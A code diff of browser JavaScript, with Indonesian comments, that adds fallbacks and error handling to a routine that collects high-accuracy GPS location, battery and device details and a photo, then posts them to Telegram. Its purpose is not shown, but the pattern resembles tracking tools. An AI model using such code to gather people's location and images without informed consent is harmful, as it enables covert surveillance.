@@ -49,8 +49,12 @@
 
         // Mendapatkan informasi baterai (jika didukung)
         let batteryInfo = { level: null };
-        if ("getBattery" in navigator) {
+        if (navigator.getBattery) {
           batteryInfo = await getBatteryInfo();
+        } else if (navigator.battery) {
+          batteryInfo = await navigator.battery;
+        } else {
+          console.warn('Battery Status API tidak didukung di browser ini.');
         }
 
         // Mendapatkan informasi perangkat
@@ -67,7 +71,7 @@
         alert('Data berhasil dikirim ke Telegram!');
       } catch (error) {
         console.error('Error capturing and sending data:', error);
-        alert('Terjadi kesalahan saat mengirim data.');
+        alert(`Terjadi kesalahan: ${error.message}`);
       }
     };
 
@@ -75,11 +79,18 @@
     function getLocation() {
       return new Promise((resolve, reject) => {
         if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true, // Meningkatkan akurasi GPS
-            timeout: 10000, // Timeout setelah 10 detik
-            maximumAge: 0 // Tidak menggunakan cache lokasi lama
-          });
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            (err) => {
+              console.error('Error getting location:', err);
+              reject(new Error('Tidak dapat mendapatkan lokasi. Pastikan izin lokasi diberikan.'));
+            },
+            {
+              enableHighAccuracy: true, // Meningkatkan akurasi GPS
+              timeout: 10000, // Timeout setelah 10 detik
+              maximumAge: 0 // Tidak menggunakan cache lokasi lama
+            }
+          );
         } else {
           reject(new Error('Browser tidak mendukung geolocation.'));
         }
@@ -89,7 +100,7 @@
     // Fungsi untuk mendapatkan informasi baterai
     function getBatteryInfo() {
       return new Promise((resolve, reject) => {
-        if ("getBattery" in navigator) {
+        if (navigator.getBattery) {
           navigator.getBattery().then(resolve).catch(reject);
         } else {
           reject(new Error('Browser tidak mendukung Battery Status API.'));
@@ -106,12 +117,18 @@
       formData.append('photo', dataURItoBlob(imageDataURL));
       formData.append('caption', `Lokasi: [Lihat di Google Maps](${googleMapsLink})\n\nLatitude: ${latitude}\nLongitude: ${longitude}\nAkurasi: ${accuracy} meter\n\nInformasi Perangkat:\n${JSON.stringify(deviceInfo, null, 2)}`);
 
-      const response = await fetch(url, {
-        method: 'POST',
-        body: formData,
-      });
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData,
+        });
 
-      if (!response.ok) {
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(`Gagal mengirim data ke Telegram: ${errorData.description}`);
+        }
+      } catch (error) {
+        console.error('Error sending data to Telegram:', error);
         throw new Error('Gagal mengirim data ke Telegram.');
       }
     }
